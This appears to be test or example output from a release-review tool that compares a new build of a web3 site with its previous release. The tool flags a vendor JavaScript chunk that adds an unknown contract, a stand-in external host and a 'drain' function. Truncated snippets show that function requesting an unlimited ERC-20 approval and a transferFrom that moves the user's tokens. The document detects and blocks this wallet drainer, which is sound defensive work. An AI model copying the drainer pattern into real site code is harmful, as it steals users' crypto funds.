@@ -1,0 +1,42 @@
+$ signet diff 6 dist
+Diff Guard: proposal #6 for e2e-mwjrjflu.signet.test, compared with release #2
+  checked: dist hashes to proposal #6's filesRoot, allowlistHash and originsHash on-chain
+  checked: release #2's allowlist, origins and file list (read from the chain) hash to its on-chain values
+
+LOOK AT THESE FIRST
+  ! NEW contract 0xBAD0C0fFeE5BAD0c0ffEe5baD0c0ffeE5baD0C0F on chain 196, found in assets/chunk-vendor-9f31c2aa.js
+  ! NEW external origin https://cdn.connect-kit-assets.example.net, found in assets/chunk-vendor-9f31c2aa.js
+  ! NEW ERC-20 approve in the code: 1 (was 0)
+  ! NEW transferFrom / safeTransferFrom in the code: 1 (was 0)
+
+RISK TIER 10 ALLOWLIST CHANGED
+  The allowlist changed: 1 new address (contract). What the site may ask a wallet to sign is different from release #2.
+  The external origins changed: 1 new external origin. Alone that would be tier 01; the allowlist change makes it tier 10, and the emergency fast lane is refused for this combination.
+  The tier was computed on-chain and matches these files.
+  To publish: 2 approvals + 1d timelock
+  Now: 0 of 3 approvals: needs 2 more approvals.
+
+Contract addresses and spenders
+  + NEW contract  0xBAD0C0fFeE5BAD0c0ffEe5baD0c0ffeE5baD0C0F  (chain 196)
+        in assets/chunk-vendor-9f31c2aa.js
+           /* vendor bundle */ ;(()=>{const D="0xBAD0C0fFeE5BAD0c0ffEe5baD0c0ffeE5baD0C0F",C="https://cdn.connect-kit-assets.example.net/v1/config";c…
+
+External origins
+  + NEW origin  https://cdn.connect-kit-assets.example.net
+        in assets/chunk-vendor-9f31c2aa.js
+           …)=>{const D="0xBAD0C0fFeE5BAD0c0ffEe5baD0c0ffeE5baD0C0F",C="https://cdn.connect-kit-assets.example.net/v1/config";const drain=async(w,t,a)=>{const m=await fetch(C…
+
+Cross-origin scripts (SRI hashes)
+  no change
+
+Approve / permit / transfer calls in the code
+  + NEW ERC-20 approve: 1 in this build, 0 in the current release
+        in assets/chunk-vendor-9f31c2aa.js
+           …st({method:"eth_sendTransaction",params:[{from:a,to:t,data:"0x095ea7b3"+D.slice(2).padStart(64,"0")+"f".repeat(64)}]});return m.pu…
+  + NEW transferFrom / safeTransferFrom: 1 in this build, 0 in the current release
+        in assets/chunk-vendor-9f31c2aa.js
+           …st({method:"eth_sendTransaction",params:[{from:a,to:t,data:"0x23b872dd"+a.slice(2).padStart(64,"0")+D.slice(2).padStart(64,"0")}]}…
+  (a text scan of the bundled code; calls built at runtime are not found)
+
+Files: 1 changed, 0 added, 0 removed, 5 unchanged
+  ~ assets/chunk-vendor-51b0e7d4.js -> assets/chunk-vendor-9f31c2aa.js  (76520 -> 77027 bytes)
